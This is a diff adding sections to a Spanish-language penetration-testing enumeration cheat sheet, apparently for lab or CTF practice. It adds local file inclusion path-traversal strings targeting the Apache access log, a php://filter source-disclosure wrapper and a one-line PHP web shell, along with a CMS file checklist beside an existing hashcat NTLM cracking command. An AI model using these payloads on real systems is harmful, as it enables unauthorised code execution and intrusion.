@@ -20,6 +20,28 @@ description: "Enumeración - CheetSheat"
 * [tshark](#tshark)
 
 
+## LFI
+
+### LFI to RCE
+
+apache log
+```
+/.././.././../var/log/apache2/access.log
+///////////..////////./.././/////////..//////log/apache2/access.log
+```
+
+```
+php://filter/convert.base64-encode/resource=<file.php>
+```
+
+payload PHP
+
+```
+<?php system($_GET['cmd']); ?>
+```
+
+----
+
 ## Samba Port 445
 
 ### Iniciar samba
@@ -361,4 +383,21 @@ NTLM
 
 ```
 hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt
+```
+
+-----------
+
+## CMS
+
+- WordPress
+- Drupal
+- Joomla
+- Gym
+
+Ficheros interesantes
+
+```
+CHANGELOG.txt
+README.txt
+robots.txt
 ```
